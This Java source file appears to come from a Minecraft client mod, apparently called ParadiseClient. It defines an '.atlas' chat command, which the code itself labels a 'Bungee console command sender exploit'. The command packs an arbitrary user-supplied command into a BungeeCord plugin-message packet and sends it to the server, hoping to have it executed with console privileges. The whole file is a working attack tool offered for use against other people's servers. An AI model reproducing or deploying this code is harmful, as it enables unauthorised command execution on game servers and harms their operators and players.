package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import io.netty.buffer.Unpooled;
import io.github.spigotrce.paradiseclientfabric.packet.BungeeCommandPayloadPacket;

public class BungeeConsole extends Command {
    public BungeeConsole(MinecraftClient minecraftClient) {
        super("atlas", "Bungee console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return LiteralArgumentBuilder.<CommandSource>literal(this.getName())
            .then(com.mojang.brigadier.builder.RequiredArgumentBuilder.argument("command", StringArgumentType.greedyString())
                .executes(this::executeCommand))
            .executes(context -> {
                Helper.printChatMessage("Usage: .atlas <bungee_command>");
                return 1;
            });
    }

    private int executeCommand(CommandContext<CommandSource> context) {
        String command = StringArgumentType.getString(context, "command");

        // Example payload structure - customize to match your Bungee plugin expectations
        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
        buf.writeString("BungeeCord");
        buf.writeString("Command");
        buf.writeString(command);

        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(
            new Identifier("bungeecord", "main"), buf
        );

        Helper.sendPacket(packet);
        Helper.printChatMessage("Bungee command sent: §b" + command);
        return 1;
    }
 }
